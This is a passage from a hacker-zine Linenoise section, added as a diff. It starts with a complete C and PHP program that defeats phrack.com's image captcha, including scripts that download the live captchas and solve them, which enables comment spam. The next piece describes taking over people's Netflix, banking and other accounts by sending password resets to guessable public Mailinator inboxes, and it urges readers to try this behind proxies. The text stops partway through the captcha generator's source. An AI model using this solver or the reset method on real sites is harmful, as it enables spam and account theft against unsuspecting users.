@@ -1,0 +1,3309 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x44, Phile #0x04 of 0x13
+
+|=-----------------------------------------------------------------------=|
+|=-----------------------=[  L I N E N O I S E  ]=-----------------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------------=[     various     ]=-------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+Linenoise iz back! The last one was in Issue 0x3f (2005 ffs) and since we
+had great short and sweet submissions we thought it was about time to
+resurrect it. After all, "a strong linenoise is key" ;-)
+
+So, dear hacker, enjoy a strong Linenoise.
+
+
+--[ Contents
+
+    1 - Spamming PHRACK for fun and profit                 -- darkjoker
+    2 - The Dangers of Anonymous Email                     -- DangerMouse
+    3 - Captchas Round 2                                   -- PHRACK PHP
+                                                              CoderZ Team
+    4 - XSS Using NBNS on a Home Router                    -- Simon Weber
+    5 - Hacking the Second Life Viewer For Fun and Profit  -- Eva
+    6 - How I misunderstood digital radio                  -- M.Laphroaig
+    7 - The 1130 Guide to Growing High-Quality Cannabis    -- 1130
+
+
+|=[ 0x01 ]=---=[ Spamming PHRACK for fun & profit - darkjoker ]=---------=|
+
+In this paper I'd like to explain how a captcha can be bypassed without
+problems with just a few lines of C.  First of all we'll pick a captcha to
+bypass, and, of course, is there any better captcha than the one of this
+site?  Of course not, so we'll take it as example.  You may have noticed
+that there are many different spam messages in the comments of the
+articles, which means that probably someone else has already bypassed the
+captcha but, instead of writing an article about it, decided to spend his
+time posting spam all around the site.  Well, I hope that this article will
+also be taken into account to make the decision to change captcha, because
+this one is really weak.
+
+First of all we're going to download some captchas, so that we'll be able
+to teach our bot how to recognise a random captcha.  In order to download
+some captchas i've written this PHP code:
+
+<?php
+mkdir ("images");
+for ($i=0;$i<200;$i++)
+   file_put_contents ("images/{$i}.jpg",file_get_contents
+                  ("http://www.phrack.com/captcha.php"));
+?>
+
+We're downloading 200 captchas, which should be enought.  Ok, once we'll
+have downloaded all the images we can proceed, cleaning the images (which
+means we're going to remove the "noise".  In these captchas the noise is
+just made of some pixel of a lighter blue than the one used to draw the
+letters.  Well, it's kind of a mess to work with JPEG images, so we'll
+convert all the images in PPM, which will make our work easier.
+
+Luckily under Linux there's a command which makes the conversion really
+easy and we won't need to do it manually:
+
+convert -compress None input.jpg output.ppm
+
+Let's do it for every image we have:
+
+<?php
+mkdir ("ppm");
+for ($i=0;$i<200;$i++)
+   system ("convert -compress None images/{$i}.jpg ppm/{$i}.ppm");
+?>
+
+Perfect, now we have everything we need to proceed.  Now, as I said
+earlier, we've to remove the noise.  That's a function which will load an
+image and then removes the noise:
+
+void load_image (int v) {
+   char img[32],line[1024];
+   int n,i,d,k,l,s;
+   FILE *fp;
+   sprintf (img, "ppm/%d.ppm",v);
+   fp = fopen (img, "r");
+   do
+      fgets (line, sizeof(line),fp);
+   while (strcmp (line, "255\n"));
+   i=0;
+   d=0;
+   k=0;
+   int cnt=0;
+   while (i!=40) {
+      fscanf (fp,"%d",&n);
+      captcha[i][d][k]=(char)n;
+      k++;
+      if (k==3) {
+         k=0;
+         if (d<119)
+            d++;
+         else {
+            i++;
+            d=0;
+         }
+      }
+   }
+}
+
+Ok, this piece of code will load an image into 'captcha', which is a 3
+dimensional array (rows*cols*3 bytes per color).  Once the array is loaded,
+using clear_noise () (written below) the noise will be removed.
+
+void clear_noise () {
+   int i,d,k,t,ti,td;
+   char n[3];
+   /* The borders are always white */
+   for (i=0;i<40;i++)
+      for (k=0;k<3;k++) {
+         captcha[i][0][k]=255;
+         captcha[i][119][k]=255;
+      }
+   for (d=0;d<120;d++)
+      for (k=0;k<3;k++) {
+         captcha[0][d][k]=255;
+         captcha[39][d][k]=255;
+      }
+   /* Starts removing the noise */
+   for (i=0;i<40;i++)
+      for (d=0;d<120;d++)
+         if (captcha[i][d][0]>__COL && captcha[i][d][1]>__COL &&
+             captcha[i][d][2]>__COL)
+            for (k=0;k<3;k++)
+               captcha[i][d][k]=255;
+   for (i=1;i<39;i++) {
+      for (d=1;d<119;d++) {
+         for (k=0,t=0;k<3;k++)
+            if (captcha[i][d][k]!=255)
+               t=1;
+         if (t) {
+            ti=i-1;
+            td=d-1;
+            for (k=0,t=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td++;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td++;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td=d-1;
+            ti=i;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td+=2;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td=d-1;
+            ti=i+1;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td++;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td++;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            if (t/3<=__MIN)
+               for (k=0;k<3;k++)
+                  captcha[i][d][k]=255;
+         }
+      }
+   }
+}
+
+Well, what does this function do? It's really easy, first of all it clears
+all the borders (because we know by looking at the downloaded images that
+the borders never contain any character).  Once the borders are cleaned,
+the second part of the routine will remove all the light blue pixels,
+turning them into white pixels.  This way we'll obtain an almost perfect
+image.  The only issue is that there are some pixels which are as dark as
+the ones which composes the characters, so we can't remove them with the
+method explained above, we'll have to create something new.  My idea was to
+"delete" all the pixels which have no blue pixels near them, so that the
+few blue pixels which doesn't compose the letters will be deleted.  In
+order to make the image cleaner I decided to delete all the pixels which
+doesn't have at least 3 pixels near them.  You may have noticed that __COL
+and __MIN are not defined in the source above, these are two numbers:
+
+#define   __COL   0x50
+#define   __MIN   4*3
+
+__COL is a number I used when I delete all the light blue pixels, I use it
+in this line:
+
+if (captcha[i][d][0]>__COL && captcha[i][d][1]>__COL &&
+    captcha[i][d][2]>__COL)
+
+In a few words, if the pixel is lighter than #505050 then it will be
+deleted (turned white). __MIN is the minimum number of conterminous pixels
+under which the pixel is deleted.  The values where obtained after a few
+attempts.
+
+Perfect, now we have a piece of code which loads and clears a captcha.  Our
+next goal is to split the characters so that we'll be able to recognise
+each of them. Before doing all this work we'd better start working with 2
+dimensional arrays, it'll make our work easier, so I've written some lines
+which makes this happen:
+
+void make_bw () {
+   int i,d;
+   for (i=0;i<40;i++)
+      for (d=0;d<120;d++)
+         if (captcha[i][d][0]!=255)
+            bw[i][d]=1;
+         else
+            bw[i][d]=0;
+}
+
+This simply transforms the image in a black and white one, so that we can
+use a 2 dimensional array.  Now we can proceed splitting the letters.
+In order to get the letters divided we are supposed to obtain two pixels
+whose coordinates are the ones of the upper left corner and the lower right
+corner. Once we have the coordinates of these two corners we'll be able to
+cut a rectangle which contains a character.
+
+Well, we're going to begin scanning the image from the left to the right,
+column by column, and every time we'll find a black pixels in a column
+which is preceded by an entire-white column, we'll know that in that column
+a new character begins, while when we'll find an entire-white column
+preceded by a column which contains at least one black pixel we'll know
+that a character ends there.
+
+Now, after this procedure is done we should have 12 different numbers which
+represents the columns where each character begins and ends.  The next step
+is to find the rows where the letter begins and ends, so that we can obtain
+the coordinates of the pixels we need.  Let's call the column where the Xth
+character begins CbX and the column where the Xth character ends CeX.  Now
+we'll start our scan from the top to the bottom of the image to find the
+upper coordinate and from the bottom to the top to find the lower
+coordinate.
+
+This time, of course, the scan will be done six times using as limits the
+columns where each character is contained between.
+
+When the first row which contains a pixel is found (let's call this row
+RbX) the same thing will be done to find the lower coordinate. The only
+difference will be that the scan will begin from the bottom, that's done
+this way because some characters (such as the 'j') are divided into two
+parts, and if the scan was done only from the bottom to the end the result
+would have been just a dot instead of the whole letter.
+
+After having scanned the image from the bottom to the top we'll have
+another row where the letter ends (or begins from the bottom), we'll call
+this row ReX (of course we're talking about the Xth character).
+
+Now we know which are the horizontal and vertical coordinates of the two
+corners we're interested in (which are C1X(CbX,RbX) and C2X(CeX,ReX)), so
+we can procede by filling a (CeX-CbX)*(ReX-RbX) matrix which will contain
+the Xth character. Obviously the matrix will be filled with the bits of the
+Xth character.
+
+void scan () {
+   int i,d,k,j,c,coord[6][2][2];
+   for (d=0,j=0,c=0;d<120;d++) {
+      for (i=0,k=0;i<40;i++)
+         if (bw[i][d])
+            k=1;
+      if (k && !j) {
+         j=1;
+         coord[c][0][0]=d;
+      }
+      else if (!k && j) {
+         j=0;
+         coord[c++][0][1]=d;
+      }
+   }
+   for (c=0;c<6;c++) {
+      coord[c][1][0]=-1;
+      coord[c][1][1]=-1;
+      for (i=0;(i<40 && coord[c][1][0]==-1);i++)
+         for (d=coord[c][0][0];d<coord[c][0][1];d++)
+            if (bw[i][d]) {
+               coord[c][1][0]=i;
+               break;
+            }
+      for (i=39;(i>=0 && coord[c][1][1]==-1);i--)
+         for (d=coord[c][0][0];d<coord[c][0][1];d++)
+            if (bw[i][d]) {
+               coord[c][1][1]=i;
+               break;
+            }
+      for (i=coord[c][1][0],j=0;i<=coord[c][1][1];i++,j++)
+         for (d=coord[c][0][0],k=0;d<coord[c][0][1];d++,k++)
+            chars[c][j][k]=bw[i][d];
+      dim[c][0]=j;
+      dim[c][1]=k;
+   }
+}
+
+Ok, now, using this function we're going to obtain all the characters
+splitted into an array of 2 dimension arrays.  The next step will be the
+most boring, because we're going to divide all the characters by hand, so
+that the program, after our work, will be able to recognise all of them and
+learn how each character is made.  Before that, we need a new directory
+which will contain all the characters.  A simple 'mkdir chars' will do.
+Now we have to fill the directory with the characters.  Here's a main
+function whose goal is to divide all the captchas into characters and put
+them in the chars/ directory.
+
+int main () {
+   int i,d,k,c,n;
+   FILE *x;
+   char path[32];
+   for (n=0,k=0;n<200;n++) {
+      load_image (n);
+      clear_noise ();
+      make_bw ();
+      scan ();
+      for (c=0;c<6;c++,k++) {
+         sprintf (path,"chars/%d.ppm",k);
+         x=fopen (path,"w");
+         fprintf (x,"P1\n#asdasd\n\n%d %d\n",dim[c][1],dim[c][0]);
+         for (i=0;i<dim[c][0];i++) {
+            for (d=0;d<dim[c][1];d++)
+               fprintf (x,"%d",chars[c][i][d]);
+            fprintf (x,"\n");
+         }
+         fclose (x);
+      }
+   }
+   return 0;
+}
+
+Very well, now the chars/ directory contains all the files we need.  Now it
+comes the part where the human is supposed to divide the characters in the
+right directories.  To make this work faster I've used a simple PHP script
+which helps a little:
+
+<?php
+$in=fopen ("php://stdin","r");
+mkdir ("c");
+for ($i=0;$i<26;$i++)
+   mkdir ("c/".chr(ord('a')+$i));
+for ($i=0;$i<10;$i++)
+   mkdir ("c/".chr(ord('0')+$i));
+for ($i=54;$i<1200;$i++) {
+   echo $i.": ";
+   $a = trim(fgets ($in,1024));
+   if ($a!='.')
+      system ("cp chars/{$i}.ppm c/{$a}/{$i}.ppm");
+}
+fclose ($in);
+?>
+
+I think there's nothing to be explained, it's just a few lines of code.
+After the script is runned and someone (me) enters all the data needed
+we're going to have a c/ directory with some subdirectories in which there
+are all the characters divided.
+
+Some characters ('a','e','i','o','u','l','0','1') never appear, which means
+that probably the author of the captcha decided not to include these
+characters.
+
+Anyway that's not a problem for us.  Now, we should work out a way to make
+our program recognise a character.  My idea was to divide the image in 4
+parts (horizontally), and then count the number of black (1) pixels in each
+part, so that when we have an unknown character all our program will be
+supposed to do is to count the number of black pixels for each part of the
+image, and then search the character with the closest number of black
+pixels.  I've tried to do it but I haven't kept into account that some
+characters (such as 'q' and 'p') have a similar number of pixels for each
+part, even though they're completely different.
+
+After having realised that, I decided to use 8 parts to divide each
+character: 4 parts horizontally, then each part is divided in other 2 parts
+vertically.
+
+Well, of course there's no way I could have done that by hand, and in fact
+I've written a PHP script:
+
+<?php
+error_reporting (E_ALL ^ E_NOTICE);
+$f = array (4,2,4/3,1);
+$arr=array ('b','c','d','f','g','h','j','k','m','n','p','q','r','s','t',
+            'v','w','x','y','z','2','3','4','5','6','7','8','9');
+$h = array ();
+for ($a=0;$a<count($arr);$a++) {
+   $i = $arr[$a];
+   $x = array ();
+   $files = scandir ("c/{$i}");
+   for ($d=0;$d<count($files);$d++) {
+      if ($files[$d][0]!='.') { // Excludes '.' and '..'
+         $lines=explode ("\n",file_get_contents ("c/{$i}/{$files[$d]}"));
+         for ($k=0;$k<4;$k++)
+            array_shift ($lines);
+         array_pop ($lines);
+         $j = count ($lines);
+         $k = strlen ($lines[0]);
+         $r=0;
+         $h[$a] += $j;
+         if ($files[$d]=="985.ppm") {
+         for ($n=0;$n<4;$n++)
+            for (;$r<floor ($j/$f[$n]);$r++) {
+               for ($l=0;$l<floor($k/2);$l++)
+                  $x[$n][0]+=$lines[$r][$l];
+               for (;$l<floor($k);$l++)
+                  $x[$n][1]+=$lines[$r][$l];
+            }
+         print_r ($x);
+         }
+      }
+   }
+   $h [$a] = round ($h[$a]/(count($files)-2));
+   for ($n=0;$n<4;$n++) {
+      $x[$n][0] = round ($x[$n][0]/(count($files)-2));
+      $x[$n][1] = round ($x[$n][1]/(count($files)-2));
+   }
+   printf ("$i => %02d %02d %02d %02d / %02d %02d %02d %02d\n",$x[0][0],
+           $x[1][0],$x[2][0],$x[3][0],$x[0][1],$x[1][1],$x[2][1],$x[3][1]);
+}
+for ($i=0;$i<count ($arr);$i++)
+   echo "{$h[$i]}, ";
+
+?>
+
+It works out the average number of black pixels for each part.  Moreover it
+also prints the average height of each character (I'm going to explain the
+reason of this below).
+
+A character such as a 'z' is divided this way:
+
+01111  111110
+11111  111111
+11111  111111
+01111  111111
+
+00000  111110
+00000  111110
+00000  111100
+00001  111100
+
+00001  111000
+00011  110000
+00011  110000
+00111  100000
+
+00111  111110
+01111  111111
+01111  111111
+00111  111110
+
+So the numbers (of the black pixels) in this case will be:
+
+18 23
+ 1 18
+ 8  8
+14 22
+
+Well, once taken all these numbers from each character the PHP script
+written above works out the average numbers for each character.  In the
+'z', for example, the average numbers are:
+
+18 20
+ 3 15
+11  7
+17 20
+
+Which are really close to the ones written above (at least, they're closer
+than the ones of the other characters).  Now the last step is to do the
+comparison between the character of the captcha we want our program to read
+and the numbers we've stored.  To do so we first need to make the program
+count the number of black pixels of a character, and save the numbers
+somewhere so that it'll be possible to do the comparison.  read_pixels ()'s
+aim is exactly to do that, using the same method used above in the PHP
+script.
+
+void read_pixels (int c) {
+   int i,d,k,r;
+   float arr[]={4,2,1.333333,1};
+   memset (bpix,0,8*sizeof(int));
+   for (k=0,i=0;k<4;k++) {
+      for (;i<(int)(dim[c][0]/arr[k]);i++) {
+         for (d=0;d<dim[c][1]/2;d++)
+            bpix[k][0] += chars[c][i][d];
+         for (;d<dim[c][1];d++)
+            bpix[k][1] += chars[c][i][d];
+      }
+   }
+}
+
+The next step is to compare the numbers, that's what the cmp () function is
+supposed to do:
+
+char cmp (int c) {
+   int i,d;
+   int err,n,min,min_i;
+   read_pixels (c);
+   for (i=0,min=-1;i<28;i++) {
+      n=abs(heights[i]-dim[c][0])*__HGT;
+      for (d=0;d<4;d++) {
+         n += abs(bpix[d][0]-table[i][0][d]);
+         n += abs(bpix[d][1]-table[i][1][d]);
+      }
+      if (min>n || min<0) {
+         min=n;
+         min_i = i;
+      }
+   }
+   return ch_list[min_i];
+}
+
+'table' is an array in which all the average numbers worked out before are
+stored.  As you can see there's a final number (n) which is the sum of a
+number obtain in this way:
+
+n += |x-y)
+
+Where 'x' is the number of black pixels of each part of the character we
+want to read, while 'y' is the average number of the character we're
+comparing the character we want to read with.  The smaller the resulting
+number is, the closer to that character.  I firstly thought that the
+algorithm I used would have been good enough, but I soon realised that
+there were too many "misunderstandings" while the program was trying to
+read some characters (such as the 'y's, which were usually read as 'v's).
+So I decided to make the final number also influenced by the height of the
+character, so that a 'v' and a 'y' (which have different heights) can't be
+misunderstood.
+
+Before this change the program couldn't recognise 17 characters out of
+1200.  Then, after some tests, I found that by adding the difference of the
+heights times a costant, the results were better: 3 wrong characters out of
+1200.
+
+n = |x-y|*k
+
+Where 'x' is the height of the character we want to read while 'y' is the
+height of the character we're comparing the character we want to read
+with.
+
+The costant (k) was calculated by doing some attempts, and finally it was
+given the value 1.5.  Now everything's ready, the last function I've
+written is read_captcha () which will return the captcha's string.
+
+char *read_captcha (char *file) {
+   char *str;
+   int i;
+   str = malloc(7*sizeof(char));
+   load_image (file);
+   clear_noise ();
+   make_bw ();
+   scan ();
+   for (i=0;i<6;i++)
+      str[i]=cmp(i);
+   str[i]=0;
+   return str;
+}
+
+And.. Done :) Now we can make our program read a captcha without any
+problem.  Now I should be supposed to code an entire spam bot, but, since
+it requires some tests I think it wouldn't be good to post random comments
+all around phrack, so my article finishes here.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define   __COL   80
+#define   __MIN   4*3
+#define   __HGT   1.5
+
+unsigned char captcha[40][120][3];
+unsigned char bw[40][120];
+unsigned char chars[6][40][30];
+int dim[6][2];
+int bpix[4][2];
+int heights[] = {
+      23, 16, 23, 23, 22, 23, 29,
+      23, 16, 16, 22, 22, 16, 16,
+      20, 16, 16, 16, 21, 16, 23,
+      24, 23, 23, 23, 23, 24, 24 };
+char ch_list [] = "bcdfghjkmnpqrstvwxyz23456789";
+int table [28][2][4]= {
+         { {18, 28, 26, 28}, { 0, 20, 25, 29}},
+         { {10, 17, 17, 10}, {21,  1,  1, 20}},
+         { { 0, 20, 25, 29}, {18, 31, 26, 31}},
+         { {10, 24, 18, 17}, {23, 12,  6,  5}},
+         { {21, 25, 20,  8}, {28, 25, 29, 27}},
+         { {18, 28, 25, 22}, { 0, 20, 25, 22}},
+         { { 1,  9,  0, 14}, {13, 27, 28, 25}},
+         { {18, 24, 30, 22}, { 0, 15, 21, 23}},
+         { {24, 21, 20, 17}, {21, 25, 24, 20}},
+         { {17, 18, 16, 14}, {20, 17, 16, 14}},
+         { {27, 25, 29, 22}, {24, 25, 25,  0}},
+         { {25, 25, 24,  0}, {27, 25, 29, 22}},
+         { {14, 16, 15, 13}, {19,  2,  0,  0}},
+         { {15, 16,  2,  9}, {12,  4, 18, 17}},
+         { {15, 20, 15, 12}, { 5, 10,  5, 19}},
+         { {13, 17, 15, 11}, {14, 14, 14, 10}},
+         { { 9, 17, 20, 13}, {12, 18, 22, 14}},
+         { { 9, 11, 11, 13}, {12, 13, 13, 12}},
+         { {15, 19, 14, 14}, {16, 20, 15,  9}},
+         { {18,  3, 11, 17}, {20, 15,  7, 20}},
+         { {21,  4,  8, 24}, {21, 26, 19, 24}},
+         { {16,  0,  6, 24}, {29, 23, 25, 28}},
+         { { 5, 12, 23,  5}, {23, 24, 32, 24}},
+         { {23, 25, 10, 20}, {18, 12, 26, 23}},
+         { { 3, 21, 28, 24}, {16, 15, 30, 27}},
+         { {18,  1, 11, 20}, {27, 24, 14,  3}},
+         { {25, 24, 26, 23}, {28, 26, 28, 28}},
+         { {20, 27, 16, 16}, {25, 26, 28,  9}} };
+
+void clear () {
+   int i,d,k;
+   for (i=0;i<40;i++)
+      for (d=0;d<120;d++)
+         for (k=0;k<3;k++)
+            captcha[i][d][k]=0;
+   for (i=0;i<40;i++)
+      for (d=0;d<120;d++)
+         bw[i][d]=0;
+   for (i=0;i<6;i++)
+      for (d=0;d<40;d++)
+         for (k=0;k<30;k++)
+            chars[i][d][k]=0;
+   for (i=0;i<6;i++)
+      for (d=0;d<2;d++)
+         dim[i][d]=0;
+}
+
+int numlen (int n) {
+   char x[16];
+   sprintf (x,"%d",n);
+   return strlen(x);
+}
+
+void load_image (char *img) {
+   char line[1024];
+   int n,i,d,k,l,s;
+   FILE *fp;
+   fp = fopen (img, "r");
+   do
+      fgets (line, sizeof(line),fp);
+   while (strcmp (line, "255\n"));
+   i=0;
+   d=0;
+   k=0;
+   int cnt=0;
+   while (i!=40) {
+      fscanf (fp,"%d",&n);
+      captcha[i][d][k]=(char)n;
+      k++;
+      if (k==3) {
+         k=0;
+         if (d<119)
+            d++;
+         else {
+            i++;
+            d=0;
+         }
+      }
+   }
+}
+
+void clear_noise () {
+   int i,d,k,t,ti,td;
+   char n[3];
+   /* The borders are always white */
+   for (i=0;i<40;i++)
+      for (k=0;k<3;k++) {
+         captcha[i][0][k]=255;
+         captcha[i][119][k]=255;
+      }
+   for (d=0;d<120;d++)
+      for (k=0;k<3;k++) {
+         captcha[0][d][k]=255;
+         captcha[39][d][k]=255;
+      }
+   /* Starts removing the noise */
+   for (i=0;i<40;i++)
+      for (d=0;d<120;d++)
+         if (captcha[i][d][0]>__COL && captcha[i][d][1]>__COL &&
+             captcha[i][d][2]>__COL)
+            for (k=0;k<3;k++)
+               captcha[i][d][k]=255;
+   for (i=1;i<39;i++) {
+      for (d=1;d<119;d++) {
+         for (k=0,t=0;k<3;k++)
+            if (captcha[i][d][k]!=255)
+               t=1;
+         if (t) {
+            ti=i-1;
+            td=d-1;
+            for (k=0,t=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td++;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td++;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td=d-1;
+            ti=i;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td+=2;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td=d-1;
+            ti=i+1;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td++;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            td++;
+            for (k=0;k<3;k++)
+               if (captcha[ti][td][k]!=255)
+                  t++;
+            if (t<__MIN)
+               for (k=0;k<3;k++)
+                  captcha[i][d][k]=255;
+         }
+      }
+   }
+}
+
+void make_bw () {
+   int i,d;
+   for (i=0;i<40;i++)
+      for (d=0;d<120;d++)
+         if (captcha[i][d][0]!=255)
+            bw[i][d]=1;
+         else
+            bw[i][d]=0;
+}
+
+void scan () {
+   int i,d,k,j,c,coord[6][2][2];
+   for (d=0,j=0,c=0;d<120;d++) {
+      for (i=0,k=0;i<40;i++)
+         if (bw[i][d])
+            k=1;
+      if (k && !j) {
+         j=1;
+         coord[c][0][0]=d;
+      }
+      else if (!k && j) {
+         j=0;
+         coord[c++][0][1]=d;
+      }
+   }
+   for (c=0;c<6;c++) {
+      coord[c][1][0]=-1;
+      coord[c][1][1]=-1;
+      for (i=0;(i<40 && coord[c][1][0]==-1);i++)
+         for (d=coord[c][0][0];d<coord[c][0][1];d++)
+            if (bw[i][d]) {
+               coord[c][1][0]=i;
+               break;
+            }
+      for (i=39;(i>=0 && coord[c][1][1]==-1);i--)
+         for (d=coord[c][0][0];d<coord[c][0][1];d++)
+            if (bw[i][d]) {
+               coord[c][1][1]=i;
+               break;
+            }
+      for (i=coord[c][1][0],j=0;i<=coord[c][1][1];i++,j++)
+         for (d=coord[c][0][0],k=0;d<coord[c][0][1];d++,k++)
+            chars[c][j][k]=bw[i][d];
+      dim[c][0]=j;
+      dim[c][1]=k;
+   }
+}
+
+void read_pixels (int c) {
+   int i,d,k,r;
+   float arr[]={4,2,1.333333,1};
+   memset (bpix,0,8*sizeof(int));
+   for (k=0,i=0;k<4;k++) {
+      for (;i<(int)(dim[c][0]/arr[k]);i++) {
+         for (d=0;d<(int)(dim[c][1]/2);d++)
+            bpix[k][0] += chars[c][i][d];
+         for (;d<dim[c][1];d++)
+            bpix[k][1] += chars[c][i][d];
+      }
+   }
+}
+
+char cmp (int c) {
+   int i,d;
+   int err,n,min,min_i;
+   read_pixels (c);
+   for (i=0,min=-1;i<28;i++) {
+      n=abs(heights[i]-dim[c][0])*__HGT;
+      for (d=0;d<4;d++) {
+         n += abs(bpix[d][0]-table[i][0][d]);
+         n += abs(bpix[d][1]-table[i][1][d]);
+      }
+      if (min>n || min<0) {
+         min=n;
+         min_i = i;
+      }
+   }
+   return ch_list[min_i];
+}
+
+char *read_captcha (char *file) {
+   char *str;
+   int i;
+   str = malloc(7*sizeof(char));
+   load_image (file);
+   clear_noise ();
+   make_bw ();
+   scan ();
+   for (i=0;i<6;i++)
+      str[i]=cmp(i);
+   str[i]=0;
+   return str;
+}
+
+int main (int argc, char *argv[]) {
+   printf ("%s\n",read_captcha ("test.ppm"));
+   return 0;
+}
+
+Oh, if you want to have some fun and the staff is so kind as to leave
+captcha.php (now captcha_old.php) you can run this PHP script:
+
+<?
+file_put_contents ("a.jpg",file_get_contents
+   ("http://www.phrack.com/captcha_old.php"));
+system ("convert -compress None a.jpg test.ppm");
+system ("./captcha");
+?>
+
+I'm done, thanks for reading :)!
+
+               darkjoker - darkjoker93 _at_ gmail.com
+
+
+|=[ 0x02 ]=---=[ The Dangers of Anonymous Email - DangerMouse ]=---------=|
+
+
+In this digital world of online banking, and cyber relationships there
+exists an epidemic. This is known simply as SPAM.
+The war on spam has been costly, with casualties on both sides. However
+finally mankind has developed the ultimate weapon to win the war...
+email anonymizers!
+
+Ok, so maybe this was a bit dramatic, but the truth is people are
+getting desperate to rid themselves of the gigantic volumes of
+unsolicited email which plagues their inbox daily. To combat this problem
+many internet users are turning to email anonymizing services such as
+Mailinator [1].
+
+Sites like mailinator.com provide a domain where any keyword can be
+created and appended as the username portion of an email address.
+So for example, if you were to choose the username "trustno1", the email
+address trustno1@mailinator.com could be used. Then the mailbox can be
+accessed without a password at http://trustno1.mailinator.com. There is
+no registration required to do this, and the email address can be created
+at a whim. Obviously this can be used for a number of things. From a
+hackers perspective, it can be very useful to quickly create an anonymous
+email address whenever one is needed. Especially one which can be checked
+easily via a chain of proxies. Hell, combine it with an anonymous visa
+gift card, and you've practically got a new identity.
+
+For your typical spam adverse user, this can be an easy way to avoid
+dealing with spam. One of the easiest ways to quickly gain an inbox
+soaked in spam is to use your real email address to sign up to every
+shiney new website which tickles your fancy. By creating a mailinator
+account and submitting that instead, the user can visit the mailinator
+website to retrieve the sign up email. Since this is not the users
+regular email account, any spam sent to it is inconsequential.
+
+The flaw with this however, is that your typical user just isn't
+creative enough to work with a system designed this way. When creating
+a fresh anonymous email account for a new website a typical users
+thought process goes something like this:
+
+a) Look up at URL for name of site
+b) Append said name to mailinator domain
+c) ???
+d) Profit
+
+This opens up a nice way for the internet's more shady characters to
+quickly gain access to almost any popular website via the commonly
+implemented "password reset" functionality.
+
+But wait, you say. Surely you jest? No one could be capable of such
+silly behavior on the internet!
+
+Alas... Apparenly Mike & Debra could.
+
+"An email with instructions on how to access Your Account has been sent to
+you at netflix@mailinator.com"
+
+"Netflix password request
+
+"Dear Mike & Debra,
+We understand you'd like to change your password. Just click here and
+follow the prompts. And don't forget your password is case sensitive."
+
+;) ?
+
+At least security folk would be immune to this you say! There's no way
+that gmail@mailinator.com would allow one to reset 2600LA's mailing list
+password...
+
+As you can imagine it's easy to wile away some time with possible
+targets ranging from popular MMO's to banking websites. Just make sure
+you use a proxy so you don't have to phone them up and give them their
+password back... *cough*
+
+Have fun! ;)
+
+                       --DangerMouse <Phrack@mailinator.com>
+
+P.S. With the rise in the popularity of social networking websites
+mailinator felt the need to go all web 2.0 by including a fancy list of
+people who "Like" mailinator on Facebook. AKA a handy target list for a
+bored individual with scripting skillz.
+
+References:
+[1] Mailinator: http://www.mailinator.com
+[2] Netflix: http://www.netflix.com
+
+
+|=[ 0x03 ]=---=[ Captchas Round 2 - phpc0derZ@phrack.org ]=--------------=|
+
+                     [ Or why we suck even more ;> ]
+
+Let's face it, our lazyness got us ;-) So what's the story behind our
+captcha? Ironically enough, the original script is coming from this URL:
+
+http://www.white-hat-web-design.co.uk/articles/php-captcha.php <-- :)))))))
+
+8<----------------------------------------------------------------------->8
+<?php
+session_start();
+
+/*
+* File: CaptchaSecurityImages.php
+* Author: Simon Jarvis
+* Copyright: 2006 Simon Jarvis
+* Date: 03/08/06
+* Updated: 07/02/07
+* Requirements: PHP 4/5 with GD and FreeType libraries
+* Link: http://www.white-hat-web-design.co.uk/articles/php-captcha.php
+*
+* This program is free software; you can redistribute it and/or
+* modify it under the terms of the GNU General Public License
+* as published by the Free Software Foundation; either version 2
+* of the License, or (at your option) any later version.
+*
+* This program is distributed in the hope that it will be useful,
+* but WITHOUT ANY WARRANTY; without even the implied warranty of
+* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+* GNU General Public License for more details:
+* http://www.gnu.org/licenses/gpl.html
+*
+*/
+
+
+class CaptchaSecurityImages {
+
+   var $font = 'monofont.ttf';
+
+   function generateCode($characters)
+   {
+      /* list all possible characters, similar looking characters and
+       * vowels have been removed */
+     $possible = '23456789bcdfghjkmnpqrstvwxyz'; $code = ''; $i = 0;
+     while ($i < $characters) {
+       $code .= substr($possible, mt_rand(0, strlen($possible)-1),1);
+       $i++;
+     }
+     return $code;
+   }
+
+   function CaptchaSecurityImages(
+        $width='120',
+        $height='40',
+        $characters='6')
+   {
+      $code = $this->generateCode($characters);
+      /* font size will be 75% of the image height */
+      $font_size = $height * 0.75;
+      $image = imagecreate($width, $height)
+      or die('Cannot initialize new GD image stream');
+      /* set the colours */
+      $background_color = imagecolorallocate($image, 255, 255, 255);
+      $text_color = imagecolorallocate($image, 20, 40, 100);
+      $noise_color = imagecolorallocate($image, 100, 120, 180);
+      /* generate random dots in background */
+      for( $i=0; $i<($width*$height)/3; $i++ ) {
+         imagefilledellipse($image,
+                            mt_rand(0,$width),
+                            mt_rand(0,$height),
+                            1,
+                            1,
+                            $noise_color);
+      }
+      /* generate random lines in background */
+      for( $i=0; $i<($width*$height)/150; $i++ ) {
+         imageline($image,
+                   mt_rand(0,$width),
+                   mt_rand(0,$height),
+                   mt_rand(0,$width),
+                   mt_rand(0,$height),
+                   $noise_color);
+      }
+      /* create textbox and add text */
